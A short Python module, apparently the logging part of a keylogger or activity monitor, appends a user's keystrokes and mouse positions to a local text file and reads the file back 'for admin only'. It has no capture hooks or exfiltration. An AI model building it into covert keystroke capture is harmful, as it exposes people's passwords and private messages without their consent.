# stores a user's keystrokes in a local text file

# file_a = file append
# file_r = file read

file_name = 'usr_log.txt'

# creates and writes to a local text file called 'usr_log'
# this is split into 2 functions for now ('mouse_append_to_log' and 'key_append_to_log')


# appends the user's mouse position to a local text file
def mouse_append_to_log(x, y):
    # formats mouse data into a more readable string
    mouse_data = 'The current mouse position is {0}'.format((x, y))
    # opens text file in append mode
    with open(file_name, 'a') as file_a:
        # appends mouse data to the text file
        file_a.write(mouse_data)


# appends the user's keystrokes to a local text file
def key_append_to_log(keystrokes):
    # formats keystrokes into a more readable string
    keystroke_data = str(keystrokes)
    # opens text file in append mode
    with open(file_name, 'a') as file_a:
        # appends keystrokes to the text file
        file_a.write(keystroke_data)


# reads from a local text file (meant for admin only)
def read_from_log(file):
    # reads from a local text file called 'usr_log'
    with open(file, 'r') as file_r:
        # creates a variable for the contents of the text file
        file_data = file_r.read()
        # prints the contents of the text file
        print(file_data)
